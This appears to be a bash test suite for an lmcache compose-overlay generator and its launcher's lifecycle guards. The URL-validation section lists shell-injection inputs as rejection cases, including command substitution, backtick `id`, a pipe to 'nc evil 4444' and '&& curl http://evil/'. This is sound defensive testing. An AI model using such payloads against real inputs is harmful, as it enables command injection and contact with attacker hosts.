#!/usr/bin/env bash
# CPU-only, hermetic gate for the lmcache/ option directory (PR #148 review):
#   1. opt-in boundary — the generated compose's shipped gate branch, run
#      through bash (not a copy), keeps the stock allocator + hash behaviour
#      and an empty KVT_ARGS for unset/0/true/2, and for exactly 1 adds ALL
#      THREE changes atomically: connector argv, PYTHONHASHSEED=0, allocator
#      unset;
#   2. source-anchor drift — the generator refuses mutated compose sources;
#   3. server-urls grammar — shell metacharacters / substitutions / bad ports
#      / fake-IPv4 hosts are refused at generation time (PR #148 injection
#      reproducer included);
#   4. rendered config — with the flag off the generated compose renders stock
#      allocator/hash behaviour; the deltas vs stock are exactly the inert
#      ones (needs docker compose; skipped with a note where unavailable);
#   5. run-lmcache-server.sh lifecycle guards under a stateful docker stub:
#      refuse under a live model container (no FORCE_REPLACE bypass), refuse
#      a live server without the override, proceed when the pair is down,
#      and fail CLOSED when docker ps itself errors.
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
COMPOSE="$ROOT/docker-compose.dspark.yml"
GEN="$ROOT/lmcache/patch-compose-lmcache.py"
QUIET=0
[ "${1:-}" = "-q" ] && QUIET=1

pass=0
fail=0
say() { [ "$QUIET" = "1" ] || printf '  ok  %s\n' "$*"; }
ok() { pass=$((pass + 1)); say "$*"; }
bad() { fail=$((fail + 1)); printf '  FAIL %s\n' "$*" >&2; }

tmp="$(mktemp -d)"
trap 'rm -rf "$tmp"' EXIT

URLS="tcp://192.0.2.10:6667,tcp://192.0.2.11:6668"
OUT="$tmp/docker-compose.lmcache.yml"

# --- 0. happy path generation -----------------------------------------------
if python3 "$GEN" "$COMPOSE" "$OUT" "$URLS" >/dev/null 2>&1 && [ -s "$OUT" ]; then
  ok "generator produces an overlay for valid tcp://host:port urls"
else
  bad "generator failed on the documented happy path"
  printf 'RESULT: %d passed, %d failed\n' "$pass" "$fail"
  exit 1
fi

# --- 0b. static post-generation invariants (docker-free) ---------------------
# The generator asserts these too, but the CONTRACT needs an independent
# defender: if a future generator edit drops an assert, this must still fail
# even on hosts with no docker — the rendered layer must not be the only
# thing standing between a regression and a green check.
inv_ok=1
grep -Fq 'PYTORCH_CUDA_ALLOC_CONF: "${PYTORCH_CUDA_ALLOC_CONF:-expandable_segments:True}"' "$OUT" \
  || { inv_ok=0; bad "overlay altered the stock PYTORCH_CUDA_ALLOC_CONF env entry"; }
if grep -Eq '^[[:space:]]+PYTHONHASHSEED:' "$OUT"; then
  inv_ok=0; bad "overlay added a service-env PYTHONHASHSEED entry (must be exported inside the gate only)"
fi
if [ "$(grep -o 'DSPARK_ENABLE_LMCACHE' "$OUT" | wc -l | tr -d ' ')" != "3" ]; then
  inv_ok=0; bad "unexpected DSPARK_ENABLE_LMCACHE occurrence count (expected one gate + one pass-through entry)"
fi
[ "$inv_ok" = "1" ] && ok "post-generation invariants: allocator entry intact, no env hashseed, single gate"

# --- 1. shipped gate, extracted from the GENERATED compose (not a copy) -----
# entrypoint text uses $$ for $; the block sits between KVT_ARGS="" and the
# allocator unset inside the exactly-1 branch.
fragment="$(sed -n '/^        KVT_ARGS="";$/,/unset PYTORCH_CUDA_ALLOC_CONF; fi;$/p' "$OUT" | sed 's/\$\$/$/g')"
if ! printf '%s\n' "$fragment" | grep -q 'LMCacheMPConnector'; then
  echo "FAIL could not extract the KVT gate from $OUT" >&2
  exit 1
fi
{
  printf '%s\n' "$fragment"
  printf '%s\n' 'if [ -n "$KVT_ARGS" ]; then echo KVT=set; else echo KVT=empty; fi'
  printf '%s\n' 'if [ -z "${PYTORCH_CUDA_ALLOC_CONF+x}" ]; then echo ALLOC=unset; else echo "ALLOC=$PYTORCH_CUDA_ALLOC_CONF"; fi'
  printf '%s\n' 'if [ -z "${PYTHONHASHSEED+x}" ]; then echo HASH=absent; else echo "HASH=$PYTHONHASHSEED"; fi'
  printf '%s\n' 'if [ -n "$KVT_ARGS" ]; then printf '\''KVTVAL %s\n'\'' "$KVT_ARGS"; fi'
} >"$tmp/gate.sh"

# Stock service env (what compose hands the entrypoint) presets the allocator.
STOCK='KVT=empty
ALLOC=expandable_segments:True
HASH=absent'
disabled_ok=1
for flag in UNSET 0 true 2 FALSE yes; do
  if [ "$flag" = "UNSET" ]; then
    out="$(env PYTORCH_CUDA_ALLOC_CONF=expandable_segments:True bash "$tmp/gate.sh")"
  else
    out="$(env DSPARK_ENABLE_LMCACHE="$flag" PYTORCH_CUDA_ALLOC_CONF=expandable_segments:True bash "$tmp/gate.sh")"
  fi
  got="$(printf '%s\n' "$out" | grep -v '^KVTVAL ')"
  [ "$got" = "$STOCK" ] || { disabled_ok=0; bad "flag=$flag changed the stock path: $(printf '%s' "$got" | tr '\n' ' ')"; }
done
[ "$disabled_ok" = "1" ] && ok "unset/0/true/2/FALSE/yes keep stock allocator, hash, and empty KVT"

out1="$(env DSPARK_ENABLE_LMCACHE=1 PYTORCH_CUDA_ALLOC_CONF=expandable_segments:True bash "$tmp/gate.sh")"
# The three probes must flip together — that is the atomicity contract.
if printf '%s\n' "$out1" | grep -qx 'KVT=set' \
&& printf '%s\n' "$out1" | grep -qx 'ALLOC=unset' \
&& printf '%s\n' "$out1" | grep -qx 'HASH=0' \
&& ! printf '%s\n' "$out1" | grep -qx 'HASH=absent'; then
  ok "exactly 1 applies all three changes together (connector argv, hashseed, allocator unset)"
else
  bad "flag=1 did not apply all three changes: $(printf '%s' "$out1" | grep -v '^KVTVAL ' | tr '\n' ' ')"
fi

# Connector payload must be valid JSON carrying the urls verbatim.
kvtval="$(printf '%s\n' "$out1" | sed -n 's/^KVTVAL //p' | head -1)"
if python3 - "$kvtval" "$URLS" <<'PY'
import json, sys
arg, urls = sys.argv[1], sys.argv[2]
flag, _, js = arg.partition(" ")
assert flag == "--kv-transfer-config", flag
cfg = json.loads(js)
assert cfg["kv_connector"] == "LMCacheMPConnector", cfg
assert cfg["kv_role"] == "kv_both", cfg
assert cfg["kv_connector_extra_config"]["lmcache.mp.server_urls"] == urls, cfg
PY
then
  ok "flag=1 emits valid --kv-transfer-config JSON with the server urls verbatim"
else
  bad "flag=1 connector payload is not the expected JSON: $kvtval"
fi

# --- 2. source-anchor drift --------------------------------------------------
mutate() { # <dst> <needle>
  python3 - "$COMPOSE" "$1" "$2" <<'PY'
import sys
src, dst, needle = sys.argv[1], sys.argv[2], sys.argv[3]
s = open(src).read()
assert needle in s, "needle already absent: " + needle
open(dst, "w").write(s.replace(needle, "# mutated\n", 1))
PY
}
drift_ok=1
for needle in \
  'if [ -n "$${DSPARK_REVISION:-}" ]; then REVISION_ARGS="--revision $${DSPARK_REVISION}"; fi;' \
  '        $${VLLM_QUANTIZATION_ARGS}
' \
  'PYTORCH_CUDA_ALLOC_CONF: "${PYTORCH_CUDA_ALLOC_CONF:-expandable_segments:True}"' \
  '      HF_HOME: /cache/huggingface
'
do
  mutate "$tmp/mut.yml" "$needle"
  if err="$(python3 "$GEN" "$tmp/mut.yml" "$tmp/mut-out.yml" "$URLS" 2>&1)"; then
    drift_ok=0
    bad "generator accepted a source with a mutated anchor: $needle"
  elif ! printf '%s' "$err" | grep -q 'not found'; then
    drift_ok=0
    bad "drift refusal had no anchor message: $err"
  fi
  [ -e "$tmp/mut-out.yml" ] && { drift_ok=0; bad "drift run still wrote an overlay"; }
done
[ "$drift_ok" = "1" ] && ok "source-anchor drift is refused on all four anchors"

# --- 3. server-urls grammar (PR #148 injection reproducer included) ----------
reject=(
  # the exact class from the review: command substitution riding an IFS trick
  "tcp://192.0.2.10:6667\$(touch${IFS}$tmp/pwn)"
  'tcp://192.0.2.10:6667`id`'
  'tcp://192.0.2.10:6667;touch x'
  'tcp://192.0.2.10:6667|nc evil 4444'
  'tcp://192.0.2.10:6667 && curl http://evil/'
  'tcp://192.0.2.10:6667"x"'
  'tcp://192.0.2.10:6667\"},\"x\":\"'
  'tcp://192.0.2.10:6667&touch x'
  'http://192.0.2.10:6667'
  'TCP://192.0.2.10:6667'
  '192.0.2.10:6667'
  'tcp://192.0.2.10'
  'tcp://192.0.2.10:6667/x'
  'tcp://192.0.2.10:0'
  'tcp://192.0.2.10:65536'
  'tcp://192.0.2.10:06667'
  'tcp://192.0.2.10:abc'
  'tcp://192.0.2.10:-1'
  'tcp://192.0.2.10:6667 '
  'tcp://192.0.2.10:6667,'
  'tcp://192.0.2.10:6667,,tcp://192.0.2.11:6668'
  'tcp://[fd00::10]:6667'
  'tcp://host_name:6667'
  'tcp://192.0.2.10:6667	tcp://192.0.2.11:6668'
  $'tcp://192.0.2.10:6667\ntcp://192.0.2.11:6668'
  # hosts that look like IPv4 literals must be valid dotted quads (RFC1123
  # would otherwise swallow them as "all-numeric labels" and defer the typo
  # to connect time)
  'tcp://999.999.999.999:6667'
  'tcp://256.1.1.1:6667'
  'tcp://01.2.3.4:6667'
  'tcp://1.2.3:6667'
  'tcp://1.2.3.4.5:6667'
  'tcp://...:6667'
)
rej_ok=1
for badurl in "${reject[@]}"; do
  if python3 "$GEN" "$COMPOSE" "$tmp/bad-out.yml" "$badurl" >/dev/null 2>&1; then
    rej_ok=0
    bad "generator accepted a rejected url: $(printf '%q' "$badurl")"
  fi
  [ -e "$tmp/bad-out.yml" ] && { rej_ok=0; bad "accepted a rejected url AND wrote an overlay: $(printf '%q' "$badurl")"; }
done
[ -e "$tmp/pwn" ] && { rej_ok=0; bad "injection marker was created"; }
[ "$rej_ok" = "1" ] && ok "all $(printf '%s\n' "${reject[@]}" | wc -l | tr -d ' ') malicious/malformed url inputs are refused"

good_ok=1
for goodurl in \
  'tcp://192.168.104.10:6667' \
  'tcp://192.168.104.10:1,tcp://192.168.104.11:65535' \
  'tcp://node-a.example.com:6667' \
  'tcp://node01:6667' \
  'tcp://localhost:6667' \
  'tcp://10.server.example:6667'
do
  if ! python3 "$GEN" "$COMPOSE" "$tmp/good.yml" "$goodurl" >/dev/null 2>&1; then
    good_ok=0
    bad "generator refused a valid url: $goodurl"
  fi
done
[ "$good_ok" = "1" ] && ok "valid urls accepted (IPv4, port bounds, FQDN, single-label, mixed)"

# --- 4. rendered-config layer (needs docker compose) --------------------------
if docker compose version >/dev/null 2>&1; then
  : >"$tmp/env"
  render() { # <compose-file> [extra env assignments...] -> stdout (or empty on failure)
    local cf="$1"; shift
    (cd "$ROOT" && env -u NODE_RANK -u HEADLESS COMPOSE_DISABLE_ENV_FILE=1 NODE_RANK=0 "$@" \
      docker compose -p dsparktest --project-directory "$ROOT" --env-file "$tmp/env" -f "$cf" config 2>/dev/null) || true
  }
  rendered_off="$(render "$OUT")"
  rendered_on="$(render "$OUT" DSPARK_ENABLE_LMCACHE=1)"
  rendered_stock="$(render "$COMPOSE")"

  if printf '%s' "$rendered_off" | grep -Eq 'DSPARK_ENABLE_LMCACHE: *"0"' \
  && printf '%s' "$rendered_off" | grep -Eq 'PYTORCH_CUDA_ALLOC_CONF: *"?expandable_segments:True"?' \
  && ! printf '%s' "$rendered_off" | grep -Eq '^[[:space:]]+PYTHONHASHSEED:'; then
    ok "rendered overlay (flag off): inert pass-through, stock allocator entry, no PYTHONHASHSEED env"
  else
    bad "rendered overlay (flag off) does not show the expected inert config"
  fi

  if printf '%s' "$rendered_on" | grep -Eq 'DSPARK_ENABLE_LMCACHE: *"1"' \
  && printf '%s' "$rendered_on" | grep -q 'LMCacheMPConnector'; then
    ok "rendered overlay (flag on): pass-through renders 1 and the gate carries the connector"
  else
    bad "rendered overlay (flag on) does not show the connector gate"
  fi

  if [ -n "$rendered_off" ] && [ -n "$rendered_stock" ]; then
    # Word-multiset compare, not line diff: the renderer re-wraps the long
    # entrypoint line, so only token multisets are stable. Normalization drops
    # YAML/shell re-escaping (backslash, double quote). The flag-off render
    # must be a PURE ADDITION over stock, and every added token must be
    # explainable by the generated overlay's own gate / pass-through lines
    # (plus the resolved "0" default of the interpolated env value).
    norm() { tr -d '"\\' | tr -s '[:space:]' '\n' | grep -v '^$' | sort; }
    ws="$(printf '%s\n' "$rendered_stock" | norm)"
    wo="$(printf '%s\n' "$rendered_off" | norm)"
    gate_words="$( { grep -e 'KVT_ARGS' -e 'DSPARK_ENABLE_LMCACHE' "$OUT"; printf '%s\n' 0 1; } | norm | sort -u)"
    removed="$(comm -23 <(printf '%s\n' "$ws") <(printf '%s\n' "$wo"))"
    unexplained="$(comm -13 <(printf '%s\n' "$ws") <(printf '%s\n' "$wo") | sort -u \
      | comm -23 - <(printf '%s\n' "$gate_words"))"
    if [ -z "$removed" ] && [ -z "$unexplained" ]; then
      ok "flag-off rendered delta vs stock is pure addition, confined to the KVT gate + pass-through"
    else
      bad "flag-off render changes more than the inert deltas (removed/unexplained tokens):"
      printf '%s\n' "$removed" "$unexplained" | { grep -v '^$' || true; } | head -10 >&2
    fi
  else
    bad "docker compose config failed to render stock or overlay"
  fi
else
  say "SKIP rendered-config checks (docker compose unavailable); gate-fragment checks above still cover the contract"
fi

# --- 5. lifecycle guards (run-lmcache-server.sh under a stateful docker stub) --
# Exercises the REAL launcher code path against a fake docker whose state
# lives in files: model/server containers "run" iff their state file is
# non-empty. The stub's run -d deliberately does NOT bring the server state
# up, so a launcher that gets past the guards dies fast in the verify loop
# (empty ps -> immediate break) instead of waiting on a real port; the
# "proceeded" marker is what we assert on, not the launcher's exit code.
mkdir -p "$tmp/bin" "$tmp/state"
cat >"$tmp/bin/docker" <<'SH'
#!/usr/bin/env bash
st() { cat "$FAKE_DOCKER_STATE/$1" 2>/dev/null || true; }
case "$1 $2" in
  "image inspect") exit 0 ;;
  "ps -q")
    case "$*" in
      *vllm-dspark*) st model ;;
      *lmcache-server*) st server ;;
      *) : ;;
    esac
    exit "${FAKE_PS_RC:-0}" ;;
  "rm -f") : >"$FAKE_DOCKER_STATE/server"; exit 0 ;;
  "run --rm") exit 0 ;;
  "run -d") touch "$FAKE_DOCKER_STATE/proceeded"; exit 0 ;;
  "logs --tail=50") exit 1 ;;
esac
exit 0
SH
chmod +x "$tmp/bin/docker"
cat >"$tmp/bin/ip" <<'SH'
#!/usr/bin/env bash
echo "1: lo    INET 127.0.0.1/8 scope host lo"
SH
chmod +x "$tmp/bin/ip"

set_states() { # <model-up?> <server-up?>
  : >"$tmp/state/model"; : >"$tmp/state/server"; rm -f "$tmp/state/proceeded"
  if [ -n "${1:-}" ]; then printf id1 >"$tmp/state/model"; fi
  if [ -n "${2:-}" ]; then printf id2 >"$tmp/state/server"; fi
}
run_launcher() { # <force-replace-value> [ps-rc] -> LRC=exit, LOUT=output
  LRC=0
  LOUT="$(PATH="$tmp/bin:$PATH" FAKE_DOCKER_STATE="$tmp/state" LMCACHE_DISK_DIR="$tmp/disk" \
    LMCACHE_FORCE_REPLACE="${1:-0}" FAKE_PS_RC="${2:-0}" \
    bash "$ROOT/lmcache/run-lmcache-server.sh" 127.0.0.1 fakeimg:latest 2>&1)" || LRC=$?
}

lc_ok=1

# Guard 1: live model container => refuse, and LMCACHE_FORCE_REPLACE must NOT help.
for force in 0 1; do
  set_states up ""
  run_launcher "$force"
  if [ "$LRC" -eq 0 ] || ! printf '%s' "$LOUT" | grep -q 'model (vllm-dspark) container is RUNNING' \
  || [ -e "$tmp/state/proceeded" ]; then
    lc_ok=0; bad "guard 1 did not refuse under a live model (force=$force): $LOUT"
  fi
done
[ "$lc_ok" = "1" ] && ok "guard 1 refuses recreation under a live model container, immune to LMCACHE_FORCE_REPLACE"

# Guard 2: live server + pair down => refuse without the override, and the live
# server must not have been rm'd.
set_states "" up
run_launcher 0
if [ "$LRC" -ne 0 ] && printf '%s' "$LOUT" | grep -q 'lmcache-server is already RUNNING' \
&& [ "$(cat "$tmp/state/server")" = "id2" ] && [ ! -e "$tmp/state/proceeded" ]; then
  ok "guard 2 refuses recreation of a live server without LMCACHE_FORCE_REPLACE"
else
  bad "guard 2 recreated a live server without override: $LOUT"
fi

# Pair down + override => proceeds past the guards to docker run.
set_states "" up
run_launcher 1
if [ -e "$tmp/state/proceeded" ]; then
  ok "guard 2 allows the documented forced re-create when no model container runs"
else
  bad "guard 2 blocked a legitimate LMCACHE_FORCE_REPLACE=1 re-create: $LOUT"
fi

# Clean state => proceeds.
set_states "" ""
run_launcher 0
if [ -e "$tmp/state/proceeded" ]; then
  ok "clean-boot path (nothing running) proceeds to docker run"
else
  bad "clean-boot path was refused: $LOUT"
fi

# Fail CLOSED: a broken docker ps must never read as "nothing is running".
set_states "" ""
run_launcher 0 1
if [ "$LRC" -ne 0 ] && printf '%s' "$LOUT" | grep -q 'without trustworthy state' \
&& [ ! -e "$tmp/state/proceeded" ]; then
  ok "lifecycle guards fail closed when docker ps itself fails"
else
  bad "guards fail-open on a docker ps error: $LOUT"
fi


printf 'RESULT: %d passed, %d failed\n' "$pass" "$fail"
[ "$fail" -eq 0 ]
